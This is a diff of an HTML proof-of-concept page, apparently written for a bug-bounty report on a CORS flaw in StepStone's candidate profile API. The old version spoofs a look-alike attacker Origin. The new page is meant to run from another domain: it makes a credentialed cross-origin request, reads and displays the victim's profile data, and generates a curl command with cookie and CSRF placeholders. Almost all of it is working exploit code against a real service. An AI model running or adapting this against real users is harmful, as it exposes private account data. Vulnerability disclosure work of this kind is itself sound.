@@ -1,36 +1,129 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>StepStone CORS PoC</title>
+  <meta charset="utf-8" />
+  <title>StepStone CORS — Demo</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; margin: 20px; color:#111; }
+    header { margin-bottom: 12px; }
+    .card { border:1px solid #e2e8f0; padding:14px; border-radius:8px; box-shadow: 0 6px 18px rgba(16,24,40,0.04); max-width:900px; }
+    label { display:block; margin-top:10px; font-weight:600; }
+    input[type=text] { width:100%; padding:8px; border-radius:6px; border:1px solid #cbd5e1; }
+    button { margin-top:10px; padding:8px 12px; border-radius:8px; border:0; background:#0ea5a4; color:white; cursor:pointer; }
+    pre { background:#f8fafc; padding:12px; border-radius:6px; overflow:auto; }
+    .muted { color:#64748b; font-size:0.95rem; }
+    .note { margin-top:10px; font-size:0.95rem; color:#0f172a }
+  </style>
 </head>
 <body>
-<h1>StepStone CORS PoC</h1>
-<button id="run">Run PoC</button>
-<pre id="output"></pre>
+  <header>
+    <h1>StepStone CORS — Demo</h1>
+    <p class="muted">Hosted on your controlled domain. Use this to show CORS headers and response in-page and in the console.</p>
+  </header>
 
-<script>
-document.getElementById("run").onclick = async () => {
-    try {
-        const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
-            method: 'GET',
-            credentials: 'include',
-            headers: {
-                'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
-            }
-        });
-        const data = await response.json();
-        document.getElementById("output").textContent =
-            JSON.stringify({
-                status: response.status,
-                origin: response.headers.get('Access-Control-Allow-Origin'),
-                credentials: response.headers.get('Access-Control-Allow-Credentials'),
-                data: data
-            }, null, 2);
-    } catch (err) {
-        document.getElementById("output").textContent = 'Error: ' + err;
+  <div class="card">
+    <label>Endpoint</label>
+    <input id="endpoint" type="text" value="https://www.stepstone.de/candidate/profile/editor/api/v1/profile" />
+
+    <label>Optional: X-CSRF-Token (only if you want to include one for demonstration)</label>
+    <input id="csrf" type="text" placeholder="paste X-Csrf-Token value (optional)" />
+
+    <button id="run">Run fetch (credentials: include)</button>
+    <button id="showCurl" style="background:#2563eb;">Generate curl command</button>
+
+    <p class="note">Result (also logged to console). Run while logged in to your test account in the same browser.</p>
+
+    <h3>Response summary</h3>
+    <pre id="summary">No attempt yet.</pre>
+
+    <h3>Response headers</h3>
+    <pre id="headers">—</pre>
+
+    <h3>Response body (truncated)</h3>
+    <pre id="body">—</pre>
+
+    <h3>Generated curl (requires you to paste your session cookie & CSRF manually)</h3>
+    <pre id="curl">—</pre>
+
+    <p class="muted">Notes: Browsers enforce SameSite cookie rules — if the server sets cookies with SameSite=Strict/Lax, the browser may not send them in this cross-site context and you may get 401. That browser protection does not change the fact that the server may be reflecting Origins and allowing credentials — provide Burp/curl evidence to triage for full validation.</p>
+  </div>
+
+  <script>
+    function logAndShow(prefix, obj) {
+      console.log(prefix, obj);
     }
-};
-</script>
+
+    function setText(id, txt) {
+      document.getElementById(id).textContent = typeof txt === 'string' ? txt : JSON.stringify(txt, null, 2);
+    }
+
+    document.getElementById('run').addEventListener('click', async () => {
+      const endpoint = document.getElementById('endpoint').value.trim();
+      const csrf = document.getElementById('csrf').value.trim();
+      setText('summary', 'Attempting fetch to ' + endpoint + ' ... (check console)');
+      try {
+        const headers = {};
+        if (csrf) headers['X-Csrf-Token'] = csrf;
+        // Note: do NOT set Origin header manually — browser sets it automatically.
+        const res = await fetch(endpoint, {
+          method: 'GET',
+          credentials: 'include',
+          headers: headers,
+          mode: 'cors'
+        });
+
+        setText('summary', `HTTP ${res.status} ${res.statusText}`);
+        // collect CORS headers we care about
+        const aco = res.headers.get('Access-Control-Allow-Origin');
+        const acc = res.headers.get('Access-Control-Allow-Credentials');
+        const vary = res.headers.get('Vary');
+        setText('headers', {
+          'Access-Control-Allow-Origin': aco,
+          'Access-Control-Allow-Credentials': acc,
+          'Vary': vary,
+          'Content-Type': res.headers.get('Content-Type'),
+          'Set-Cookie (example)': res.headers.get('Set-Cookie') || '(Set-Cookie visible in network panel)'
+        });
+        logAndShow('CORS headers:', { aco, acc, vary });
+
+        // Attempt to read body as text (some responses may be blocked)
+        let text = '';
+        try {
+          text = await res.text();
+        } catch (e) {
+          text = 'Error reading body: ' + String(e);
+        }
+        // Try parse JSON for nicer display
+        try {
+          const j = JSON.parse(text);
+          setText('body', j);
+          console.log('Body JSON:', j);
+        } catch (e) {
+          setText('body', text.slice(0, 2000));
+          console.log('Body (raw):', text);
+        }
+
+      } catch (err) {
+        setText('summary', 'Fetch error: ' + String(err));
+        console.error('Fetch error:', err);
+      }
+    });
+
+    document.getElementById('showCurl').addEventListener('click', () => {
+      const endpoint = document.getElementById('endpoint').value.trim();
+      const csrf = document.getElementById('csrf').value.trim();
+      // curl template (user must replace COOKIESTRING and CSRF values)
+      const curl = [
+        'curl -i \\',
+        `  -H "Origin: ${location.origin}" \\`,
+        csrf ? `  -H "X-Csrf-Token: ${csrf}" \\` : '  # (optional) -H "X-Csrf-Token: <token>" \\',
+        '  -b "COOKIESTRING" \\',
+        `  "${endpoint}"`
+      ].join('\n');
+      setText('curl', curl);
+      console.log('Generated curl command (replace COOKIESTRING with your cookies):\n' + curl);
+    });
+  </script>
 </body>
 </html>
